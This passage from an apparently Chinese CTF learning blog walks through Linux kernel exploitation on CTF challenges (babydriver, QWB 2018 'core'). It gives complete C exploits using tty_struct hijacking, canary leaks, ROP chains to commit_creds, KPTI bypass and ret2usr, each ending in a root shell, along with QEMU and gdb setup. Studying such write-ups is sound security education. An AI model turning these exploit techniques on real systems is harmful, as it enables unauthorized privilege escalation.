class="line">	&#123;</span><br><span class="line">		fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>; </span><br><span class="line">	&#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>;  <span class="comment">//pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">    fake_tty_operations[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;  <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class="line">    <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">32</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">    write(fd2,fake_tty_struct, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>安装<code>vmlinux-to-elf</code>工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line">vmlinux-to-elf ./bzImage vmlinux</span><br></pre></td></tr></table></figure>

<p>调试启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span>\</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \ </span><br><span class="line">    --nographic \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>rootfs打包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rootfs 打包</span></span><br><span class="line">pushd rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line">popd</span><br></pre></td></tr></table></figure>



<p>gdb调试脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">gdb ./vmlinux</span><br><span class="line">target remote localhost:1234</span><br><span class="line">c</span><br><span class="line">add-symbol-file babydriver.ko 0xffffffffc0000000</span><br><span class="line">b babyopen</span><br><span class="line">c</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>gadget获取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; ./gadgets</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Kernel ROP入门学习</title>
    <url>/posts/8981f97e.html</url>
    <content><![CDATA[<p> 参考链接：<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">a3大佬</a></p>
<h2 id="01-Kernel-ROP-basic"><a href="#01-Kernel-ROP-basic" class="headerlink" title="01. Kernel ROP - basic"></a>01. Kernel ROP - basic</h2><p>所需要构造执行的ROPchain为<code>commit_creds(prepare_kernel_cerd(&amp;init_task))</code>或<code>commit_creds(&amp;init_cred)</code>（这个似乎更方便，要去找对应内核的源码，然后用ida打开vmlinux查看其对应位置）</p>
<p>当成功执行如上函数之后，当前线程的cred结构体便会变为init进程的cred的拷贝，也就获得了root权限，此时在用户态起一个shell便能获得root shell。</p>
<blockquote>
<p>旧版本内核上所用的提权方法<code>commit_creds(prepare_kernel_cred(NULL))</code>已经不再能被使用，在高版本的内核当中<code>prepare_kernel_cred(NULL)</code>将不再返回一个root cred。</p>
</blockquote>
<h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>exploit需要进入到内核当中完成提权，而我们最终仍然需要着陆回到用户态来获取一个root权限的shell，因此在进入内核态之前我们需要手动模拟用户态进入内核态的准备工作——保存各寄存器的值到内核栈上。</p>
<p>通常使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造rop链：</p>
<blockquote>
<p>通用的pwn板子</p>
<p>使用内联汇编，编译时需要指定参数：<code>-masm=intel</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h3><p><a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/">内核态返回用户态的过程</a></p>
<ul>
<li>swapgs指令恢复用户态GS寄存器</li>
<li>sysretq或者iretq恢复到用户空间</li>
</ul>
<p>只需要在内核中找到相应的gadget并执行swapgs;iretq即可返回用户态</p>
<p>一般来说，构造返回用户态ROP链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapgs</span><br><span class="line">iretq</span><br><span class="line">user_shell_addr</span><br><span class="line">user_cs</span><br><span class="line">user_eflags		// 64bit user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>

<h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><p>查看<code>start.sh</code>，开启了kaslr防护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>解压文件系统，查看<code>init</code>文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; ../core.cpio.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp; # 定时关机</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f # 定时关机</span><br></pre></td></tr></table></figure>

<p>其中将&#x2F;proc&#x2F;kallsysms符号表内容复制到tmp目录下，因此可以访问其符号地址</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>checksec一下，开启了NX和canary</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ checksec --file=core.ko</span><br><span class="line">[*] &#x27;/mnt/d/Bronya/Brownie/CTF/practice/0ops内训/kernel/qwb_2018_core/core/rootfs/core.ko&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x0)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>使用ida反汇编</p>
<p><code>init_module</code>函数初始化了一个设备<code>/proc/core</code>，<code>core_fops</code>结构体定义了<code>write</code>, <code>ioctl</code>, <code>release</code>三个操作：</p>
<img src="/posts/8981f97e/image-20250602120843207.png" class="" title="image-20250602120843207">

<p><code>core_write</code>函数，可以向bss段写入长度为0x800的数据：</p>
<img src="/posts/8981f97e/image-20250602121340689.png" class="" title="image-20250602121340689">

<p><code>core_ioctl</code>函数定义了三种功能，core_read读取栈空间内容；修改off变量值；</p>
<img src="/posts/8981f97e/image-20250602121508106.png" class="" title="image-20250602121508106">

<p><code>core_read</code>函数将栈上数据拷贝给a1，也就用户态：</p>
<img src="/posts/8981f97e/image-20250602120951140.png" class="" title="image-20250602120951140">

<p><code>core_copy_func</code>函数复制name内指定长度内容到栈上，由于此处qmemcpy时长度使用了强制类型转换，可以发现存在整数溢出，可以设置int64类型下为负值，但int16下为大于63的值：</p>
<img src="/posts/8981f97e/image-20250602121605188.png" class="" title="image-20250602121605188">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用栈溢出在栈上构造ROP chain来提权</p>
<p>只要可以在内核空间执行<code>commit_cred(prepare_kernel_cred(NULL))</code>，即可将进程权限提升至root</p>
<p>调试时可以先把kaslr关掉，获取没有偏移的函数地址，后续再通过该值计算偏移。</p>
<img src="/posts/8981f97e/image-20250602125010382.png" class="" title="image-20250602125010382">

<p>构造exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define symbols variables</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>; prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// enter kernel func: save status </span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to get the root!&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;[+] Successful to get the root.&quot;</span>);</span><br><span class="line">    log_info(<span class="string">&quot;[*] Execve root shell now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// to exit normally, instead of potential segmentation fault</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// interact with /proc/core</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889b</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off_val</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889c</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889d</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploition</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS            0xffffffff9909c8e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET             0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX    0xffffffff8101aa6a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET             0xffffffff810a0f49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET             0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPFQ_RET        0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ                   0xffffffff81050ac2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploition</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE *ksyms_file;</span><br><span class="line">    <span class="comment">// open device</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> canary;</span><br><span class="line">    <span class="type">size_t</span> rop_chain[<span class="number">0x100</span>], i;</span><br><span class="line">    </span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to exploit...&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] open device error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get addresses of kernel symbols</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading /tmp/kallsyms...&quot;</span>);</span><br><span class="line">    ksyms_file = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ksyms_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to open the sym_table file!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(ksyms_file, <span class="string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (prepare_kernel_cred &amp;&amp; commit_creds) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                SUCCESS_MSG(<span class="string">&quot;[+] Successful to get the addr of commit_creds: &quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(</span><br><span class="line">                <span class="string">&quot;[+] Successful to get the addr of prepare_kernel_cred&quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = commit_creds - COMMIT_CREDS;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot;[+] Got kernel base: &quot;</span>) <span class="string">&quot;%lx&quot;</span></span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot; , kaslr offset: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">        kernel_base,</span><br><span class="line">        kernel_offset</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading value of kernel stack canary...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    set_off_val(fd, <span class="number">64</span>);</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span>*) buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got kernel stack canary: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// build rop chain</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain[i++] = POP_RDI_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = prepare_kernel_cred;</span><br><span class="line">    rop_chain[i++] = POP_RDX_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = POP_RCX_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX+kernel_offset; <span class="comment">// 因为为call，会push ip入栈</span></span><br><span class="line">    rop_chain[i++] = commit_creds;</span><br><span class="line">    rop_chain[i++] = SWAPGS_POPFQ_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = IRETQ+kernel_offset;</span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp+<span class="number">8</span>;     <span class="comment">// userland stack balance</span></span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to execute ROP chain in kernel space...&quot;</span>);</span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    core_copy(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    exploition();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./exp.c -o exp -static -masm=intel</span><br></pre></td></tr></table></figure>

<p>打包进文件系统，执行exp获取root shell</p>
<img src="/posts/8981f97e/image-20250602142213030.png" class="" title="image-20250602142213030">

<h3 id="返回用户态-with-KPTI-bypass"><a href="#返回用户态-with-KPTI-bypass" class="headerlink" title="返回用户态 with KPTI bypass"></a>返回用户态 with KPTI bypass</h3><p>如果开启了KPTI（内核页表隔离），不能像前面直接swapgs ; iretq返回用户态，而是在返回用户态之前还需要将用户进程的页表给切换回来。</p>
<blockquote>
<p>Linux采用四级页表结构(PGD -&gt; PUD -&gt; PMD -&gt; PTE)，而CR3控制寄存器用以存储当前的PGD的地址，因此在开启KPTI的情况下用户态与内核态之间的切换便涉及到CR3的切换，为了提高切换的速度，内核将内核空间的PGD和用户空间的PGDD两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间在高地址），这样只需要将CR3的第13位取反便能完成页表切换的操作。</p>
<img src="/posts/8981f97e/Rm8Ti9MpVUZ7fPK.png" class="" title="image.png">

<p>这两张页表上都有对用户空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有内核页表中才有对内核内存空间的完整映射。</p>
<img src="/posts/8981f97e/q74X6lbTnrNGhC1.png" class="" title="image.png">
</blockquote>
<p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应的在<code>arch/x86/entry/entry_64.S</code>中提供了一个用于完成内核态页表切换回到用户态页表的函数<code>swapgs_restore_regs_and_return_to_usermode</code>，地址也可以在<code>proc/kallsyms</code>中获得。</p>
<img src="/posts/8981f97e/FpymLdwJMnRU4hi.png" class="" title="image.png">

<p>在实际操作时前面的栈操作可以跳过，直接从<code>mov rdi, rsp</code>开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov cr3, rdi</span><br><span class="line">pop rax</span><br><span class="line">pop rdi</span><br><span class="line">swapgs</span><br><span class="line">iretq</span><br></pre></td></tr></table></figure>

<p>因此对应的栈布局</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">↓	swapgs<span class="number">_</span>restore<span class="number">_</span>regs<span class="number">_</span>and<span class="number">_</span><span class="keyword">return</span><span class="number">_</span>to<span class="number">_u</span>sermode</span><br><span class="line">    <span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">    <span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">    user<span class="number">_</span>shell<span class="number">_</span>addr</span><br><span class="line">    user<span class="number">_</span>cs</span><br><span class="line">    user<span class="number">_</span>rflags</span><br><span class="line">    user<span class="number">_</span>sp</span><br><span class="line">    user<span class="number">_</span>ss</span><br></pre></td></tr></table></figure>

<h4 id="例题：强网杯2018-core-1"><a href="#例题：强网杯2018-core-1" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h4><p>在启动脚本中启动参数添加<code>pti=on</code>开启KPTI保护</p>
<p>之前的exp无法执行，会报segfault，因为在内核态页表下用户地址无法执行。</p>
<p>因此在返回用户态之前还需要先将内核态页表切换回来，这里直接调用<code>swapgs_restore_regs_and_return_to_usermode</code>函数返回用户态即可。</p>
<img src="/posts/8981f97e/image-20250602144835707.png" class="" title="image-20250602144835707">

<h2 id="02-Kernel-ROP-ret2usr"><a href="#02-Kernel-ROP-ret2usr" class="headerlink" title="02. Kernel ROP - ret2usr"></a>02. Kernel ROP - ret2usr</h2><p>在未开启SMAP&#x2F;SMEP保护的情况下，内核空间是可以访问用户空间的数据的。因此通过kernel ROP以内核ring0权限执行用户空间代码来完成提权。</p>
<p>ret2usr只需要在用户态程序构造好对应的<code>commit_creds(prepare_kernel_cred(NULL))</code>函数指针即可。</p>
<p>对于开启了SMAP&#x2F;SMEP保护的kernel而言，内核空间访问用户空间会引发kernel panic。</p>
<h3 id="例题：强网杯2018-core-2"><a href="#例题：强网杯2018-core-2" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h3><p>劫持控制流后，构造好对应的函数指针和相关指令直接返回到用户空间进行ret2usr提权。</p>
<p>构造exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span 